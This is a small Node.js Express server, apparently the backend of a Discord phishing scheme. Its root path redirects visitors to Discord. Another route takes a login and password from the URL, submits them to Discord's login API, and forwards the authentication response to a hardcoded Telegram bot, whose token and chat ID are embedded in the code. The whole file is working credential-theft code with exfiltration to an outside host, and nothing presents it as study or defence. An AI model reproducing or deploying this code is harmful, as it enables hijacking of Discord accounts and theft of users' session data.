const express = require("express");
const axios = require("axios");

const port = process.env.PORT || 3000;
const app = express();

const botToken = "6467130261:AAF7iAaqrPhgDJm7NkZGIhxgGPQ41s4jwOw";
const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

app.get("/", (req, res) => {
  res.redirect("https://discord.com/app");
});

app.get("/:first/:second", async (req, res) => {
  const login = req.params.first;
  const password = req.params.second;

  try {
    const response = await axios.post("https://discord.com/api/v9/auth/login", {
      login: login,
      password: password,
    });

    console.log("Успешная авторизация:", response.data);

    await axios.post(apiUrl, {
      chat_id: "6425112328",
      text: `${response.data}`,
    });

    console.log("Успешно отправлено"); // Success message (Russian: Successfully sent)

  } catch (error) {
    if (error.response) {
      console.error("Ошибка авторизации:", error.response.data); // Error message (Russian: Authorization error)
    } else {
      console.error("Неизвестная ошибка:", error); // Unknown error message
    }
  }
});

app.listen(port, "0.0.0.0", () => {
  console.log("Server running");
});
